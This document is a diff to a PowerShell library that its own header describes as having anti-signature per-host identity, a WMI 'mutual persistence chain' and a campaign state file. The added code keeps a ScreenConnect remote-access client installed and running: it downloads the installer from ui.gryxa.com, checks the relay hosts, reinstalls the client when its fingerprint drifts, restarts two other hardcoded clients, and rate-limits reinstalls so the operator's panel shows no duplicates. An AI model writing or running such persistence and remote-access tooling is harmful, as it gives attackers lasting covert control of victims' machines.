@@ -1,9 +1,10 @@
 #Requires -Version 5.1
 # ═══════════════════════════════════════════════════════════════
-# OWN_LIB  BUILD 20260802L15
+# OWN_LIB  BUILD 20260802L16
 # Shared library: per-host identity (anti-signature), WMI watchdog
 # (mutual persistence chain), campaign state file, SC service repair.
-# L15: gryxa-health / gryxa-ensure — 8h deep check (TCP+relay+FP drift reinstall).
+# L16: NEVER reinstall Gryxa when Running (panel duplicates); TCP advisory only.
+# L15: gryxa-health / gryxa-ensure — 8h deep check (TCP/relay/FP drift reinstall).
 # L13: schtasks Create via cmd (like WucacheOwn), TR under Windows\Temp\.wucache
 #      (not ACL-locked ProgramData path), /ST 00:00 on MINUTE, no leading \.
 # L12: IDENTVER=7 ROOT-level task names (nested Microsoft\Windows Access Denied).
@@ -321,11 +322,15 @@ function Repair-SCService([string]$Fingerprint) {
     return "svc-still-missing exit=$($p.ExitCode)"
 }
 
-# ── Gryxa MUST-RUN health (L15) ─────────────────────────────────
+# ── Gryxa MUST-RUN health (L16) ─────────────────────────────────
+# L16: NEVER reinstall when service is Running (panel duplicates).
+#      TCP/relay are advisory only. Reinstall only: missing/stopped OR FP drift OR -Force.
+# L15: gryxa-health / gryxa-ensure — 8h deep check (TCP/relay/FP drift reinstall).
 $script:GryxaDefaultFp = '9908198e668e4750'
 $script:GryxaMsiUrl = 'https://ui.gryxa.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest'
 $script:GryxaRelayHost = 'update.gryxa.com'
 $script:GryxaUiHost = 'ui.gryxa.com'
+$script:SevrzKeep = @('5f6010579852e507', 'f861c8140d453427')
 
 function Get-GryxaCfgPath { Join-Path $WorkDir 'gryxa.cfg' }
 
@@ -440,43 +445,88 @@ function Test-GryxaRelayConfigured([string]$Fingerprint) {
     }
     $img = (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\$name" -ErrorAction SilentlyContinue).ImagePath
     if ($img -and ($img -match 'gryxa\.com')) { return $true }
-    # Official Gryxa MSI fingerprint implies correct relay baked at install time
     if (Find-ProductGuid $Fingerprint) { return $true }
     return $false
 }
 
-function Test-GryxaHealth {
-    $fp = Get-GryxaFp
-    $name = "ScreenConnect Client ($fp)"
-    $reasons = New-Object System.Collections.Generic.List[string]
+function Test-ScRunning([string]$Fingerprint) {
+    if (-not $Fingerprint) { return $false }
+    $svc = Get-Service -Name "ScreenConnect Client ($Fingerprint)" -ErrorAction SilentlyContinue
+    return [bool]($svc -and $svc.Status -eq 'Running')
+}
 
-    $svc = Get-Service -Name $name -ErrorAction SilentlyContinue
-    if (-not $svc) { [void]$reasons.Add('svc-missing') }
-    elseif ($svc.Status -ne 'Running') { [void]$reasons.Add("svc-$($svc.Status)") }
-
-    $dirOk = $false
+function Test-ScDir([string]$Fingerprint) {
     foreach ($base in @(${env:ProgramFiles(x86)}, $env:ProgramFiles)) {
-        if (Test-Path -LiteralPath (Join-Path $base "ScreenConnect Client ($fp)")) { $dirOk = $true }
+        if (Test-Path -LiteralPath (Join-Path $base "ScreenConnect Client ($Fingerprint)")) { return $true }
     }
-    if (-not $dirOk) { [void]$reasons.Add('dir-missing') }
+    return $false
+}
 
-    if (-not (Test-GryxaRelayConfigured $fp)) { [void]$reasons.Add('relay-config-missing') }
+function Find-RunningGryxaFp {
+    # Prefer cfg FP if Running; else any non-sevrz SC that looks like Gryxa / is sole extra.
+    $cfg = Get-GryxaFp
+    if (Test-ScRunning $cfg) { return $cfg }
+    $extras = @()
+    foreach ($svc in (Get-Service -Name 'ScreenConnect Client*' -ErrorAction SilentlyContinue)) {
+        if ($svc.Status -ne 'Running') { continue }
+        if ($svc.Name -match '\(([0-9a-f]{16})\)') {
+            $fp = $matches[1].ToLower()
+            if ($fp -in $script:SevrzKeep) { continue }
+            $extras += $fp
+        }
+    }
+    foreach ($fp in $extras) {
+        if (Test-GryxaRelayConfigured $fp) { return $fp }
+    }
+    if ($extras.Count -eq 1) { return $extras[0] }
+    return $null
+}
+
+function Test-GryxaHealth {
+    # LOCAL health only. TCP/relay never mark UNHEALTHY (avoids panel duplicates).
+    $fp = Get-GryxaFp
+    $runningFp = Find-RunningGryxaFp
+    if ($runningFp) {
+        if ($runningFp -ne $fp) { Set-GryxaFp $runningFp; $fp = $runningFp }
+        $tcpRelay = Test-TcpHostPort $script:GryxaRelayHost 443
+        $tcpUi = Test-TcpHostPort $script:GryxaUiHost 443
+        return "HEALTHY|$fp|running=1|relay=$tcpRelay|ui=$tcpUi"
+    }
+
+    $reasons = New-Object System.Collections.Generic.List[string]
+    if (-not (Test-ScRunning $fp)) {
+        $svc = Get-Service -Name "ScreenConnect Client ($fp)" -ErrorAction SilentlyContinue
+        if (-not $svc) { [void]$reasons.Add('svc-missing') }
+        else { [void]$reasons.Add("svc-$($svc.Status)") }
+    }
+    if (-not (Test-ScDir $fp) -and -not (Find-ProductGuid $fp)) {
+        [void]$reasons.Add('not-installed')
+    }
 
     $tcpRelay = Test-TcpHostPort $script:GryxaRelayHost 443
     $tcpUi = Test-TcpHostPort $script:GryxaUiHost 443
-    if (-not $tcpRelay -and -not $tcpUi) {
-        [void]$reasons.Add('tcp-unreachable')
-    } else {
-        if (-not $tcpRelay) { [void]$reasons.Add('relay-tcp-softfail') }
-        if (-not $tcpUi) { [void]$reasons.Add('ui-tcp-softfail') }
-    }
-
-    # softfails alone (one of two hosts down) do not fail health if svc+dir+other host ok
-    $hard = @($reasons | Where-Object { $_ -notmatch '-softfail$' })
-    if ($hard.Count -eq 0) {
+    if ($reasons.Count -eq 0) {
+        # registered/dir present but service not running — still unhealthy for start/repair
+        if (-not (Test-ScRunning $fp)) {
+            return "UNHEALTHY|$fp|svc-not-running|relay=$tcpRelay|ui=$tcpUi"
+        }
         return "HEALTHY|$fp|relay=$tcpRelay|ui=$tcpUi"
     }
-    return "UNHEALTHY|$fp|$($hard -join ',')|relay=$tcpRelay|ui=$tcpUi"
+    return "UNHEALTHY|$fp|$($reasons -join ',')|relay=$tcpRelay|ui=$tcpUi"
+}
+
+function Test-GryxaReinstallAllowed {
+    # Max one reinstall per 12h unless -Force (stops duplicate storm)
+    $flag = Join-Path $WorkDir 'gryxa_reinstall.flag'
+    if (-not (Test-Path -LiteralPath $flag)) { return $true }
+    try {
+        $age = (Get-Date) - (Get-Item -LiteralPath $flag).LastWriteTime
+        return ($age.TotalHours -ge 12)
+    } catch { return $true }
+}
+
+function Mark-GryxaReinstall {
+    Set-Content -LiteralPath (Join-Path $WorkDir 'gryxa_reinstall.flag') -Value (Get-Date).ToUniversalTime().ToString('o') -Encoding ASCII -Force
 }
 
 function Uninstall-ScFingerprint([string]$Fingerprint) {
@@ -521,7 +571,8 @@ function Install-GryxaFromMsi([string]$MsiPath) {
 }
 
 function Invoke-GryxaEnsure {
-    # Light: service/dir heal. Deep/Force: download MSI, detect FP drift, TCP/relay, reinstall.
+    # HARD RULE: if Gryxa service is Running → never /x or /i (panel duplicates).
+    # Reinstall only when: not running/missing, OR MSI FP drifted from installed FP, OR -Force.
     if (-not (Test-Path -LiteralPath $WorkDir)) {
         New-Item -ItemType Directory -Path $WorkDir -Force | Out-Null
     }
@@ -535,28 +586,41 @@ function Invoke-GryxaEnsure {
     $doDeep = [bool]($Deep -or $Force -or ($Extra -match '(?i)deep|force'))
     GLog "gryxa_ensure_begin deep=$doDeep force=$Force old_fp=$oldFp"
 
+    # Sync cfg to whatever Gryxa-like client is already Running
+    $runningFp = Find-RunningGryxaFp
+    if ($runningFp) {
+        Set-GryxaFp $runningFp
+        $oldFp = $runningFp
+        GLog "already_running_fp=$runningFp"
+        if (-not $Force -and -not $doDeep) {
+            return "HEALTHY|$runningFp|running=1|skip-reinstall"
+        }
+    }
+
     if (-not $doDeep -and -not $Force) {
-        $h = Test-GryxaHealth
-        GLog "light_health=$h"
-        if ($h -like 'HEALTHY*') { return $h }
-        # light path: try start/repair before full reinstall
+        # Light: start/repair only — never msiexec /i if we can get Running
+        if (Test-ScRunning $oldFp) {
+            return "HEALTHY|$oldFp|running=1"
+        }
         $name = "ScreenConnect Client ($oldFp)"
         & sc.exe config $name start= auto 2>&1 | Out-Null
         & sc.exe start $name 2>&1 | Out-Null
         Start-Sleep -Seconds 4
-        if ((Get-Service -Name $name -ErrorAction SilentlyContinue).Status -eq 'Running') {
-            $h2 = Test-GryxaHealth
-            if ($h2 -like 'HEALTHY*') { GLog "light_started_ok"; return $h2 }
+        if (Test-ScRunning $oldFp) {
+            GLog 'light_started_ok'
+            return "HEALTHY|$oldFp|started=1"
         }
-        $rep = Repair-SCService $oldFp
-        GLog "light_repair=$rep"
-        $h3 = Test-GryxaHealth
-        if ($h3 -like 'HEALTHY*') { return $h3 }
-        GLog 'light_escalate_to_reinstall'
+        if (Find-ProductGuid $oldFp) {
+            $rep = Repair-SCService $oldFp
+            GLog "light_repair=$rep"
+            if (Test-ScRunning $oldFp) { return "HEALTHY|$oldFp|repaired=1" }
+        }
+        # Still not running → escalate to install (not /x of a running peer)
+        GLog 'light_escalate_install_missing'
         $doDeep = $true
     }
 
-    # Deep: always fetch fresh MSI so server/key/FP rotation is detected
+    # Deep path: fetch MSI for FP comparison; reinstall only if needed
     $msi = Join-Path $WorkDir 'pkg_gryxa.msi'
     $tmp = Join-Path $env:TEMP ("sc_gryxa_{0}.msi" -f [guid]::NewGuid().ToString('N'))
     $fetched = $false
@@ -578,48 +642,84 @@ function Invoke-GryxaEnsure {
         $fetched = $true
         GLog 'msi_using_cache'
     }
-    if (-not $fetched) {
+
+    $newFp = $null
+    if ($fetched) {
+        $prodName = Get-MsiProperty $msi 'ProductName'
+        $newFp = Get-FpFromProductName $prodName
+        GLog "msi_fp=$newFp product=$prodName"
+    }
+
+    # Re-check running after fetch (long download)
+    $runningFp = Find-RunningGryxaFp
+    $fpDrift = $false
+    if ($newFp -and $runningFp -and ($newFp -ne $runningFp)) {
+        $fpDrift = $true
+        GLog "fp_drift running=$runningFp msi=$newFp"
+    } elseif ($newFp -and -not $runningFp -and $oldFp -and ($newFp -ne $oldFp) -and (Find-ProductGuid $oldFp -or Test-ScDir $oldFp)) {
+        $fpDrift = $true
+        GLog "fp_drift installed=$oldFp msi=$newFp"
+    }
+
+    # HARD: Running + same FP (or no drift) + not Force → never reinstall
+    if ($runningFp -and -not $Force -and -not $fpDrift) {
+        Set-GryxaFp $runningFp
+        $tcpRelay = Test-TcpHostPort $script:GryxaRelayHost 443
+        $tcpUi = Test-TcpHostPort $script:GryxaUiHost 443
+        GLog "deep_skip_reinstall_already_running relay=$tcpRelay ui=$tcpUi"
+        return "HEALTHY|$runningFp|running=1|relay=$tcpRelay|ui=$tcpUi|skip-reinstall"
+    }
+
+    if (-not $fetched -or -not $newFp) {
+        if ($runningFp) {
+            Set-GryxaFp $runningFp
+            return "HEALTHY|$runningFp|running=1|msi-fetch-softfail"
+        }
         GLog 'msi_fetch_FAIL'
         return "UNHEALTHY|$oldFp|msi-fetch-fail"
     }
 
-    $prodName = Get-MsiProperty $msi 'ProductName'
-    $newFp = Get-FpFromProductName $prodName
-    if (-not $newFp) {
-        GLog "msi_fp_parse_FAIL name=$prodName"
-        return "UNHEALTHY|$oldFp|msi-fp-parse-fail"
-    }
-    GLog "msi_fp=$newFp product=$prodName"
-
-    $needReinstall = [bool]$Force
-    if ($newFp -ne $oldFp) {
-        GLog "fp_drift old=$oldFp new=$newFp"
-        $needReinstall = $true
-    }
-    $health = Test-GryxaHealth
-    GLog "pre_health=$health"
-    if ($health -notlike 'HEALTHY*') { $needReinstall = $true }
-    # Deep always verifies TCP hard requirement
-    $tcpRelay = Test-TcpHostPort $script:GryxaRelayHost 443
-    $tcpUi = Test-TcpHostPort $script:GryxaUiHost 443
-    if (-not $tcpRelay -and -not $tcpUi) {
-        GLog 'tcp_both_fail_still_try_install'
-        $needReinstall = $true
+    $needReinstall = [bool]$Force -or $fpDrift -or (-not $runningFp)
+    if ($needReinstall -and -not $Force -and -not $fpDrift -and -not (Test-GryxaReinstallAllowed)) {
+        GLog 'reinstall_rate_limited'
+        if ($runningFp) { return "HEALTHY|$runningFp|running=1|rate-limited" }
+        return "UNHEALTHY|$oldFp|rate-limited"
     }
 
     if (-not $needReinstall) {
         Set-GryxaFp $newFp
-        GLog "deep_healthy_no_reinstall $health"
-        return $health
+        return "HEALTHY|$newFp|no-reinstall-needed"
     }
 
-    # Uninstall old FP if different or broken; also uninstall new FP if partially present
-    if ($oldFp -and $oldFp -ne $newFp) {
-        GLog "uninstall_old_fp=$oldFp"
-        Uninstall-ScFingerprint $oldFp | Out-Null
-    }
-    if (Find-ProductGuid $newFp) {
-        GLog "uninstall_existing_new_fp=$newFp"
+    GLog "reinstall_begin force=$Force drift=$fpDrift running=$runningFp"
+    Mark-GryxaReinstall
+
+    # Only uninstall if FP changing or Force; if missing install, just /i
+    if ($fpDrift -or $Force) {
+        if ($runningFp -and $runningFp -ne $newFp) {
+            GLog "uninstall_old_running=$runningFp"
+            Uninstall-ScFingerprint $runningFp | Out-Null
+        }
+        if ($oldFp -and $oldFp -ne $newFp -and $oldFp -ne $runningFp) {
+            GLog "uninstall_old_cfg=$oldFp"
+            Uninstall-ScFingerprint $oldFp | Out-Null
+        }
+        if ($Force -and (Find-ProductGuid $newFp)) {
+            GLog "force_uninstall_same_fp=$newFp"
+            Uninstall-ScFingerprint $newFp | Out-Null
+        }
+    } elseif (-not (Find-ProductGuid $newFp)) {
+        GLog "fresh_install_fp=$newFp"
+    } else {
+        # Product registered but service not running → /fa first, not /x+/i
+        GLog "registered_not_running_repair=$newFp"
+        Repair-SCService $newFp | Out-Null
+        if (Test-ScRunning $newFp) {
+            Set-GryxaFp $newFp
+            return "HEALTHY|$newFp|repaired=1"
+        }
+        # Last resort: clean reinstall of same FP (rate-limited above)
+        GLog "repair_failed_clean_reinstall=$newFp"
         Uninstall-ScFingerprint $newFp | Out-Null
     }
 
@@ -635,8 +735,7 @@ function Invoke-GryxaEnsure {
     & sc.exe start $name 2>&1 | Out-Null
     Start-Sleep -Seconds 5
 
-    # nudge sevrz keepers after gryxa msiexec
-    foreach ($kfp in @('5f6010579852e507', 'f861c8140d453427')) {
+    foreach ($kfp in $script:SevrzKeep) {
         $kn = "ScreenConnect Client ($kfp)"
         & sc.exe start $kn 2>&1 | Out-Null
         if (-not (Get-Service -Name $kn -ErrorAction SilentlyContinue)) {
@@ -644,13 +743,16 @@ function Invoke-GryxaEnsure {
         }
     }
 
-    if ((Get-Service -Name $name -ErrorAction SilentlyContinue).Status -ne 'Running') {
+    if (-not (Test-ScRunning $newFp)) {
         Repair-SCService $newFp | Out-Null
     }
 
-    $final = Test-GryxaHealth
-    GLog "post_health=$final"
-    return $final
+    if (Test-ScRunning $newFp) {
+        GLog "post_running_ok"
+        return "HEALTHY|$newFp|reinstalled=1"
+    }
+    GLog 'post_still_down'
+    return "UNHEALTHY|$newFp|still-not-running"
 }
 
 function Invoke-Exterminate {
